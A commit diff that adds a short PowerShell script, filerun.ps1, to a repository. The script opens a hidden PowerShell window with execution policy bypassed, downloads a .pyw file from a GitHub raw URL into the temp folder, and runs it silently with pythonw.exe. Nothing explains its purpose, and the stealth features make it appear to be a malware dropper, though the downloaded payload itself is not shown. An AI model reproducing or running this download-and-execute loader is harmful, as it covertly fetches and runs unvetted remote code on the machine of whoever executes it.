007a20b68336ab3314a20ba18c18af0ca5ce4b54
KevinDark5 <jotpaz@imail.edu.vn>
2025-01-09 08:43:27 +0700

    Add files via upload

--- filerun.ps1
+++ filerun.ps1
@@ -1,1 +1,12 @@
+cmd /c start /min "" powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command"
 
+$url = "https://github.com/KevinDark5/data/raw/refs/heads/main/cac.pyw"
+
+
+$tempPath = "$env:TEMP\cac.pyw"
+
+
+Invoke-WebRequest -Uri $url -OutFile $tempPath
+
+
+Start-Process -FilePath "pythonw.exe" -ArgumentList $tempPath
